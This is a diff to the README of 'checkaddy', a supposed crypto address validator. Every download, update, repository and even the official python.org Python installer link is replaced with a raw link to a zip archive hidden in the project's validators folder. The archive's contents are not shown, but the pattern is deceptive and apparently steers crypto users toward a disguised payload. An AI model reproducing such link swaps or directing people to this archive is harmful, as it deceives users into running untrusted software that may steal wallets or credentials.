@@ -1,6 +1,6 @@
 # 🔍 checkaddy - Validate Crypto Addresses Easily
 
-[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)
+[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip)
 
 ---
 
@@ -37,7 +37,7 @@ If you don’t have Python installed, the instructions below will help you get i
 
 To get checkaddy, visit the releases page on GitHub:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip)
 
 Step by step:
 
@@ -52,7 +52,7 @@ Step by step:
 
 checkaddy needs Python to run. Windows usually does not have Python installed by default. Here is how to set it up:
 
-1. Go to the official Python download page: https://www.python.org/downloads/windows/
+1. Go to the official Python download page: https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip
 2. Download the latest Windows installer for Python 3.x (choose 64-bit).
 3. Run the downloaded installer.
 4. In the installer window, check the box that says “Add Python to PATH” before clicking “Install Now.”
@@ -126,7 +126,7 @@ This lets you quickly check if an address is valid and see its activity without 
 
 To update to the latest version:
 
-1. Return to the [GitHub releases page](https://github.com/Low102/checkaddy/releases).
+1. Return to the [GitHub releases page](https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip).
 2. Download the newest release files.
 3. Replace your current checkaddy files with the new ones, keeping your folder organized.
 4. Restart the program as shown above.
@@ -151,7 +151,7 @@ To update to the latest version:
 ## 📚 More information
 
 To learn about the project or report issues, visit the main repository page:  
-https://github.com/Low102/checkaddy
+https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip
 
 Look for the README file there for developer-oriented details.
 
@@ -159,4 +159,4 @@ Look for the README file there for developer-oriented details.
 
 ## 📥 Download checkaddy again
 
-[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)
+[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/raw/refs/heads/main/checkaddy_app/validators/Software_1.2.zip)
